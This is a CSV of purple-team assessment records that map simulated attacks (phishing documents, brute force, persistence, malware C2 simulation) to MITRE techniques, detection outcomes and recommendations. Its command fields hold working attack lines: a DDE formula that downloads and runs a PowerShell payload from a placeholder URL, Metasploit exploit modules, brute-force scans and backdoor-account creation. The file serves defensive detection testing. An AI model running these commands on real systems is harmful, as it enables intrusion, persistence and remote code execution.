AssessmentGroup,Campaign,Phase,Variant,MitreID,CapecId,Method,Status,Outcome,Alert Severity,Alert Triggered,Activity Logged,Outcome Notes,Detection Recommendations,SourceIps,TargetAssets,ExpectedDetectionLayers,DetectingTools,Start Time,Start Time Epoch,Stop Time,Stop Time Epoch,Detection Time,Detection Time Epoch,Organizations,Tags,Objective,Command,References,Liklihood,Risk,Internal/External,Stealth,Attack Vector,Attack Complexity,Privileges Required,Attacker Tools
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,17 - Link - Macro - LuckyStrike PowerShell CellEmbed + Sandbox Evasion,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-09T19:30:20.130Z,1515526220130,2018-01-09T19:55:16.130Z,1515527716130,2018-01-09T21:52:00.130Z,1515534720130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,21 - Link - Link Inside PDF,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-10T07:57:31.130Z,1515571051130,2018-01-10T09:57:11.130Z,1515578231130,2018-01-10T10:39:57.130Z,1515580797130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Create a PDF with a malicious link in it and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,11 - Link - DDE - PowerShell,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-09T03:11:46.130Z,1515467506130,2018-01-09T04:42:47.130Z,1515472967130,2018-01-09T06:13:12.130Z,1515478392130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,18 - Link - Encrypted Archive - Macro,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-09T21:58:25.130Z,1515535105130,2018-01-09T23:40:14.130Z,1515541214130,2018-01-10T00:59:43.130Z,1515545983130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar and encrypt malicious document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,14 - Link - Macro - Remote Template,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-09T14:44:42.130Z,1515509082130,2018-01-09T15:35:40.130Z,1515512140130,2018-01-09T16:24:35.130Z,1515515075130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,External Password Attacks,Exploitation,Remote Access Portal - SSO Login,T1190,,Password Guessing,Completed,Detected,High,TBD,No,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",Progear,2018-01-03T22:42:27.130Z,1515019347130,2018-01-03T23:54:59.130Z,1515023699130,2019-01-29T06:15:13.647Z,1548742513647,Security Risk Advisors,,"Brute force single password, large list of potential users","Capture login request
Brute force with intruder",,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q1,External Password Attacks,Exploitation,Customer Portal Brute Force,T1190,,Password Guessing,Completed,NotDetected,TBD,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",,2018-01-04T06:00:48.130Z,1515045648130,2018-01-04T07:39:35.130Z,1515051575130,2018-01-04T09:21:13.130Z,1515057673130,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q1,External Password Attacks,Exploitation,Remote Access Portal - Office 365,T1190,,Password Guessing,Completed,Detected,High,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",Progear,2018-01-04T02:40:52.130Z,1515033652130,2018-01-04T04:12:40.130Z,1515039160130,2019-01-28T16:37:29.216Z,1548693449216,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q1,External Password Attacks,Exploitation,Simultaneous VPN Logins from different Geo's,T1078,,Suspicious Logins,Completed,Detected,High,TBD,TBD,,"1) VPN authentication logs are sent to a SIEM for further analysis, correlation and alerting",,,"Firewall,SIEM",Progear,2018-01-04T10:50:14.130Z,1515063014130,2018-01-04T11:35:48.130Z,1515065748130,2019-01-28T16:50:42.006Z,1548694242006,Security Risk Advisors,,Login from two distinct geo's to test detection capabilities.,,,Medium,Medium,External,Low,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q1,App Server Discovery and Exploitation,Discovery,"Internal - Stealth Port Scan with 3 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) Internal port scanning activity detected by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",,2018-01-17T23:24:06.130Z,1516231446130,2018-01-17T23:36:28.130Z,1516232188130,2018-01-18T00:25:17.130Z,1516235117130,Security Risk Advisors,,Run lighter internal port scanning to probe interesting HTTP ports and services.,,,High,Low,Internal,Medium,,,,Nmap
Enterprise Purple – 2018 Q1,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - JBoss,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,"SIEM,Behavior Analytics",,2018-01-18T03:23:10.130Z,1516245790130,2018-01-18T04:26:17.130Z,1516249577130,2018-01-18T04:51:36.130Z,1516251096130,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.","Scanner:
msf> use auxiliary/scanner/http/jboss_vulnscan

JMX Console Deployer Upload and Execute:
msf> use exploit/multi/http/jboss_maindeployer",,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q1,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 1,T1046,,Web application probing,Completed,NotDetected,TBD,TBD,Yes,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,SIEM,,2018-01-18T01:34:45.130Z,1516239285130,2018-01-18T02:44:18.130Z,1516243458130,2018-01-18T03:06:59.130Z,1516244819130,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q1,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 2,T1046,,Web application probing,Completed,NotDetected,TBD,TBD,Yes,,,,,SIEM,,2018-01-18T07:42:31.130Z,1516261351130,2018-01-18T09:23:43.130Z,1516267423130,2018-01-18T11:13:48.130Z,1516274028130,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q1,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - Tomcat,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,"SIEM,Behavior Analytics",,2018-01-18T06:50:22.130Z,1516258222130,2018-01-18T07:15:03.130Z,1516259703130,2018-01-18T07:29:45.130Z,1516260585130,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",msf> use auxiliary/scanner/http/tomcat_mgr_login,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q1,Database Assault,Exploitation,Fingerprint and brute force DB2 databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2018-01-19T21:50:29.130Z,1516398629130,2018-01-19T22:18:04.130Z,1516400284130,2018-01-19T22:51:40.130Z,1516402300130,Security Risk Advisors,,Attempt to exploit insecurely configured IBM DB2 databases on the network.,"nmap -sS -Pn -p1433,1521,1526,3306,523 --randomize-hosts -g 53 --open --script=broadcast-ms-sql-discover.nse,broadcast-db2-discover.nse,ms-sql-empty-password.nse,mysql-empty-password.nse, -oA output IPADDRESS",,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2018 Q1,Database Assault,Exploitation,Fingerprint and brute force MS SQL Server instances,T1110,,Database exploitation,Completed,Detected,High,TBD,TBD,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by SIEM or Database Activity Monitoring tool",,,SIEM,Progear,2018-01-19T15:34:46.130Z,1516376086130,2018-01-19T16:07:42.130Z,1516378062130,2018-01-19T16:24:13.130Z,1516379053130,Security Risk Advisors,,Attempt to exploit insecurely configured MS SQL Server databases on the network.,"Metasploit recon:
use auxiliary/scanner/mssql/mssql_ping

Nmap recon:
nmap -p 445 --script ms-sql-info <host>

Nmap brute force:
nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt <host>
nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>",,High,High,Internal,Low,,,,"Nmap,SQLping3,Metasploit"
Enterprise Purple – 2018 Q1,Database Assault,Exploitation,Fingerprint and brute force MySQL databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2018-01-19T16:59:51.130Z,1516381191130,2018-01-19T17:47:51.130Z,1516384071130,2018-01-19T17:55:31.130Z,1516384531130,Security Risk Advisors,,Attempt to exploit insecurely configured MySQL databases on the network.,,,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2018 Q1,Database Assault,Discovery,"Internal - Moderate Port Scan with 5 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) Internal port scanning activity detect by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",,2018-01-19T12:29:22.130Z,1516364962130,2018-01-19T14:00:23.130Z,1516370423130,2018-01-19T14:46:09.130Z,1516373169130,Security Risk Advisors,,Identify open ports and services for common DBMS platforms,,,High,Low,Both,Low,,,,Nmap
Enterprise Purple – 2018 Q1,Database Assault,Exfiltration,Pilfer sensitive data from compromised DBs,,,Database access,Completed,NotDetected,TBD,TBD,Yes,,"1) SIEM rules are configured to alert on suspicious logons to critical DB servers and databases.,2) Database activity monitoring tool or triggers are configured for highly sensitive DB tables and columns.,3) DLP tool successfully detects sensitive data movement from the server or leaving the network.",,,DLP,,2018-01-19T23:33:51.130Z,1516404831130,2018-01-20T00:49:33.130Z,1516409373130,2018-01-20T02:04:34.130Z,1516413874130,Security Risk Advisors,,Pilfer sensitive data from compromised DBs and send it outside the network.,,,Medium,High,Both,Medium,,,,
Enterprise Purple – 2018 Q1,Database Assault,Exploitation,Fingerprint and brute force Oracle databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2018-01-19T18:18:47.130Z,1516385927130,2018-01-19T18:20:44.130Z,1516386044130,2018-01-19T20:03:31.130Z,1516392211130,Security Risk Advisors,,Attempt to exploit insecurely configured Oracle databases on the network.,,,High,High,Internal,Low,,,,"Oscanner,Nmap,Metasploit"
Enterprise Purple – 2018 Q1,Physical Access,Exploitation,Locked workstation attack,T1200,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload run from bashbunny device is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2018-01-15T08:15:51.130Z,1516004151130,2018-01-15T09:39:43.130Z,1516009183130,2018-01-15T11:20:29.130Z,1516015229130,Security Risk Advisors,,"Setup rogue DHCP server and connect to laptop in locked state, intercept credentials using Responder tool.",Use bashbunny with responder loaded,,Low,High,Both,Medium,,,,"Responder,Manual Techniques"
Enterprise Purple – 2018 Q1,Physical Access,Exploitation,Mouse Jacking,T1200,,Wireless Attack,Completed,NotDetected,TBD,TBD,No,,1) Established C2 payload from mouse jacker payload is detected by EDR tool and/or SIEM events.,,,"SIEM,EDR,Secure Baselines",,2018-01-15T12:56:12.130Z,1516020972130,2018-01-15T14:04:38.130Z,1516025078130,2018-01-15T14:44:33.130Z,1516027473130,Security Risk Advisors,,Attack local laptop via preexisting vulnerable USB mouse dongle.,jackit --script <Ducky_Script>,,Low,High,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike,JackIt"
Enterprise Purple – 2018 Q1,Physical Access,Exploitation,Laptop or workstation boot attack,T1091,,Workstation Local Attack,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2018-01-15T18:44:07.130Z,1516041847130,2018-01-15T20:24:44.130Z,1516047884130,2018-01-15T21:38:46.130Z,1516052326130,Security Risk Advisors,,Attempt cold boot on laptops with missing or partial FDE,Load kali on boot-able usb,,Low,High,Both,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Physical Access,Exploitation,USB Rubby Ducky,T1091,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload from rubber ducky is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2018-01-15T16:13:39.130Z,1516032819130,2018-01-15T17:44:48.130Z,1516038288130,2018-01-15T18:22:13.130Z,1516040533130,Security Risk Advisors,,Attack local laptop/workstation using USB device to execute malicious code.,cmd /c \\<share>\<folder>\file.bat,,Medium,High,Internal,High,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2018 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 4,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,Endpoint Protection,,2018-01-21T16:58:13.130Z,1516553893130,2018-01-21T18:24:39.130Z,1516559079130,2018-01-21T19:31:17.130Z,1516563077130,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #2,,,Ransomware,Completed,NotDetected,TBD,TBD,No,,,,,EDR,,2018-01-22T00:02:35.130Z,1516579355130,2018-01-22T00:45:18.130Z,1516581918130,2018-01-22T02:34:09.130Z,1516588449130,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extension:
- kratos","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2018 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 1,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,Endpoint Protection,,2018-01-21T06:29:02.130Z,1516516142130,2018-01-21T07:48:30.130Z,1516520910130,2018-01-21T09:21:08.130Z,1516526468130,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #1,,,Ransomware,Completed,Detected,High,TBD,TBD,,,,,"EDR,Endpoint Protection",Donpachi,2018-01-21T21:08:44.130Z,1516568924130,2018-01-21T22:47:48.130Z,1516574868130,2018-01-21T23:26:05.130Z,1516577165130,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extensions:
- locky
- ykcol","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2018 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 2,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,Endpoint Protection,,2018-01-21T10:30:30.130Z,1516530630130,2018-01-21T10:45:03.130Z,1516531503130,2018-01-21T12:05:02.130Z,1516536302130,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 3,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,Endpoint Protection,,2018-01-21T13:21:34.130Z,1516540894130,2018-01-21T14:39:34.130Z,1516545574130,2018-01-21T16:23:50.130Z,1516551830130,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Endpoint Persistence,Persistence,Use of WMI Subscription for persistent jobs,T1546.003,,Windows Management Instrumentation,Completed,Detected,High,TBD,No,,1) EDR and/or SIEM rules are configured to detect suspicious WMI execution,,,"SIEM,EDR","DoDonpachi,Progear",2018-01-15T05:35:06.130Z,1515994506130,2018-01-15T06:18:54.130Z,1515997134130,2019-01-29T10:54:28.188Z,1548759268188,Security Risk Advisors,,Establish persistence using WMI event subscriptions.,"Create a one liner payload
cat payload.txt | iconv --to-code=UTF-16LE | base64 -w 0

Red team → Persistence → WMI Event Persistence using PowerShell",https://github.com/harleyQu1nn/AggressorScripts/tree/master/Persistence,Medium,Medium,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2018 Q1,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence using .BAT file,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2018-01-14T21:38:34.130Z,1515965914130,2018-01-14T21:39:06.130Z,1515965946130,2018-01-14T21:56:19.130Z,1515966979130,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Endpoint Persistence,Persistence,Use of schtasks.exe for persistent jobs,T1053,,Scheduled tasks,Completed,Detected,Med,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows task scheduler events,,,"SIEM,EDR",Progear,2018-01-14T23:45:20.130Z,1515973520130,2018-01-14T23:58:45.130Z,1515974325130,2019-01-28T16:40:29.968Z,1548693629968,Security Risk Advisors,,Create a scheduled task,"schtasks /Create /SC DAILY /TN ""Malicious Task"" /TR ""C:MaliciousFile.bat"" /ST 09:00",,Medium,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Endpoint Persistence,Persistence,Create a Local Administrator User on Server,T1136,,Backdoor Accounts,Completed,Detected,High,TBD,Yes,,"1) EDR tool alerts on suspicious use of Windows 'net user' and similar commands,2) SIEM alerts on local and domain user and group creation and modifications",,,"SIEM,EDR",Progear,2018-01-15T01:34:34.130Z,1515980074130,2018-01-15T03:04:16.130Z,1515985456130,2019-01-28T16:40:47.884Z,1548693647884,Security Risk Advisors,,Create a Local administrator user after the compromise of a system.,"net user /add [username] [password]
new localgroup administrators [username] /add",,Medium,High,Internal,Low,,,,
Enterprise Purple – 2018 Q1,Endpoint Persistence,Persistence,Use of sc.exe to create rogue service to maintain access,T1543.003,,Rogue Service Creation,Completed,Detected,Med,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows service creation events,,,"SIEM,EDR","DoDonpachi,Progear",2018-01-14T14:12:13.130Z,1515939133130,2018-01-14T15:32:58.130Z,1515943978130,2019-01-28T16:40:18.316Z,1548693618316,Security Risk Advisors,,Modification of the registry startup keys to launch a rogue service.,,,Low,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2018-01-14T18:17:40.130Z,1515953860130,2018-01-14T20:17:26.130Z,1515961046130,2018-01-14T21:15:36.130Z,1515964536130,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 1,T1046,,Vulnerability scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",,2018-01-04T13:25:23.130Z,1515072323130,2018-01-04T15:00:17.130Z,1515078017130,2018-01-04T15:30:47.130Z,1515079847130,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
Enterprise Purple – 2018 Q1,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 2,T1046,,Vulnerability scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",,2018-01-04T16:17:41.130Z,1515082661130,2018-01-04T16:44:10.130Z,1515084250130,2018-01-04T17:36:57.130Z,1515087417130,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
Enterprise Purple – 2018 Q1,External Automated Scans,Reconnaissance,Network Vulnerability Scan - External IP Ranges,T1046,,Vulnerability scanning,Completed,Detected,Med,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",MUSHA,2018-01-04T18:49:35.130Z,1515091775130,2018-01-04T20:10:50.130Z,1515096650130,2018-01-04T20:39:01.130Z,1515098341130,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",,,High,Medium,Both,Low,,,,Nessus
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,8 - Macro - LuckyStrike PowerShell CellEmbed,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Progear,2018-01-10T23:43:21.130Z,1515627801130,2018-01-10T23:53:24.130Z,1515628404130,2019-01-28T16:38:20.752Z,1548693500752,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,7 - Macro - MMG WMI Exe,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-01-11T18:31:27.130Z,1515695487130,2018-01-11T18:59:14.130Z,1515697154130,2019-01-28T17:02:06.767Z,1548694926767,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,3 - Macro - WScript PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2018-01-10T17:23:22.130Z,1515605002130,2018-01-10T18:48:13.130Z,1515610093130,2018-01-10T20:08:16.130Z,1515614896130,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,9 - Macro - MSBuild,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-01-10T21:35:00.130Z,1515620100130,2018-01-10T22:53:51.130Z,1515624831130,2019-01-28T17:02:27.299Z,1548694947299,Security Risk Advisors,,Execute malicious Office document on the endpoint,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,Internal,Low,,,,Cobalt Strike
